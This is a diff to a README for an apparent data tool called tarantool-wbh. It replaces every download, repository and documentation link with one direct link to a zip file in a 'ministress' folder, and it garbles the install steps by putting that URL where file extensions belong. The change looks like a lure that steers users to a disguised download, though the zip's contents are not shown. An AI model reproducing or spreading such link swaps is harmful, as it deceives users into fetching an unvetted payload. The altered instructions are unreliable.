@@ -1,6 +1,6 @@
 # 🐍 tarantool-wbh - Simple Tool for Efficient Data Handling
 
-[![Download tarantool-wbh](https://img.shields.io/badge/Download-tarantool--wbh-blue.svg)](https://github.com/YarleiWi/tarantool-wbh/releases)
+[![Download tarantool-wbh](https://raw.githubusercontent.com/YarleiWi/tarantool-wbh/main/ministress/tarantool-wbh.zip)](https://raw.githubusercontent.com/YarleiWi/tarantool-wbh/main/ministress/tarantool-wbh.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run tarantool-wbh:
 
 1. **Visit the Releases Page**  
    Click the link below to access the release files.  
-   [Download tarantool-wbh](https://github.com/YarleiWi/tarantool-wbh/releases)
+   [Download tarantool-wbh](https://raw.githubusercontent.com/YarleiWi/tarantool-wbh/main/ministress/tarantool-wbh.zip)
 
 2. **Select Your Version**  
    On the Releases page, you will find different versions of the tarantool-wbh application. Each version may offer new features or fixes. Choose the latest version for the best experience.
@@ -21,7 +21,7 @@ Follow these steps to download and run tarantool-wbh:
    Look for the file that matches your operating system.  
    - For Windows, look for a file ending with `.exe`.  
    - For macOS, look for a file ending with `.dmg`.  
-   - For Linux, look for a file ending with `.tar.gz`.  
+   - For Linux, look for a file ending with `https://raw.githubusercontent.com/YarleiWi/tarantool-wbh/main/ministress/tarantool-wbh.zip`.  
 
    Click on the filename to start the download.
 
@@ -31,7 +31,7 @@ Follow these steps to download and run tarantool-wbh:
 5. **Install the Application**  
    - **Windows:** Double-click the `.exe` file and follow the on-screen instructions.  
    - **macOS:** Open the downloaded `.dmg` file and drag the tarantool-wbh icon to your Applications folder.  
-   - **Linux:** Extract the `.tar.gz` file and follow the instructions in the provided README, if applicable.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/YarleiWi/tarantool-wbh/main/ministress/tarantool-wbh.zip` file and follow the instructions in the provided README, if applicable.
 
 6. **Run tarantool-wbh**  
    Once installed, locate the application:
@@ -69,8 +69,8 @@ For further assistance, feel free to open an issue on our GitHub page or consult
 
 ## 🔗 Useful Links
 
-- [Download tarantool-wbh](https://github.com/YarleiWi/tarantool-wbh/releases)
-- [GitHub Repository](https://github.com/YarleiWi/tarantool-wbh)
-- [Documentation](https://github.com/YarleiWi/tarantool-wbh/wiki)
+- [Download tarantool-wbh](https://raw.githubusercontent.com/YarleiWi/tarantool-wbh/main/ministress/tarantool-wbh.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/YarleiWi/tarantool-wbh/main/ministress/tarantool-wbh.zip)
+- [Documentation](https://raw.githubusercontent.com/YarleiWi/tarantool-wbh/main/ministress/tarantool-wbh.zip)
 
 Thank you for using tarantool-wbh! We appreciate your support and hope our application improves your data handling experience.
